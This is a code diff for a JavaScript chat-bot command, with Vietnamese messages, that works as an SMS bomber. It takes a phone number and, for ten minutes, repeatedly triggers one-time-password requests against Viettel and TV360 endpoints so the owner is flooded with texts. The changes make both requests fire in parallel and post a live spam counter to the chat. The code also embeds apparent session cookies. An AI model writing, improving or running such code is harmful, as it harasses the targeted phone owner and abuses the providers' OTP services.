@@ -14,6 +14,7 @@ module.exports = {
     }
 
     const phone = args[1];
+    const spamDuration = 10 * 60 * 1000; // 10 minutes in milliseconds
     const viettelCookies = {
       'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
       '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
@@ -63,47 +64,42 @@ module.exports = {
     let successCount = 0;
     let failureCount = 0;
 
+    // Send initial message showing spam details
+    const initialMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
+    api.sendMessage(initialMessage, event.threadID, (error, messageInfo) => {
+      if (!error) {
+        messageID = messageInfo.messageID;
+      }
+    });
+
     // Function to send spam requests
     const sendSpamRequests = () => {
-      // Send request to Viettel API
-      axios.post('https://viettel.vn/api/get-otp', viettelData, {
-        headers: viettelHeaders,
-        withCredentials: true,
-        cookies: viettelCookies,
+      // Send both requests in parallel
+      Promise.all([
+        axios.post('https://viettel.vn/api/get-otp', viettelData, {
+          headers: viettelHeaders,
+          withCredentials: true,
+          cookies: viettelCookies,
+        }),
+        axios.post("http://m.tv360.vn/public/v1/auth/get-otp-login", tv360Data, {
+          headers: tv360Headers
+        })
+      ])
+      .then(() => {
+        successCount += 2;
+        updateMessage();
       })
-      .then(response => {
-        successCount++;
-        updateMessage(`Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`);
-      })
-      .catch(error => {
-        failureCount++;
-        updateMessage(`Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`);
-      });
-
-      // Send request to TV360 API
-      axios.post("http://m.tv360.vn/public/v1/auth/get-otp-login", tv360Data, {
-        headers: tv360Headers
-      })
-      .then(response => {
-        successCount++;
-        updateMessage(`Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`);
-      })
-      .catch(error => {
-        failureCount++;
-        updateMessage(`Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`);
+      .catch(() => {
+        failureCount += 2;
+        updateMessage();
       });
     };
 
     // Function to update the message with success and failure count
-    const updateMessage = (text) => {
+    const updateMessage = () => {
+      const updatedMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
       if (messageID) {
-        api.editMessage(text, event.threadID, messageID);
-      } else {
-        api.sendMessage(text, event.threadID, (error, messageInfo) => {
-          if (!error) {
-            messageID = messageInfo.messageID;
-          }
-        });
+        api.editMessage(updatedMessage, event.threadID, messageID);
       }
     };
 
@@ -113,10 +109,10 @@ module.exports = {
     // Send the first spam request immediately
     sendSpamRequests();
 
-    // Optionally, stop spamming after a certain time period
+    // Stop spamming after the specified duration
     setTimeout(() => {
       clearInterval(interval);
       api.sendMessage(`Đã dừng spam SMS cho số ${phone}. Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`, event.threadID, event.messageID);
-    }, 600000); // Stop after 10 minutes (600000 milliseconds)
+    }, spamDuration);
   }
 };
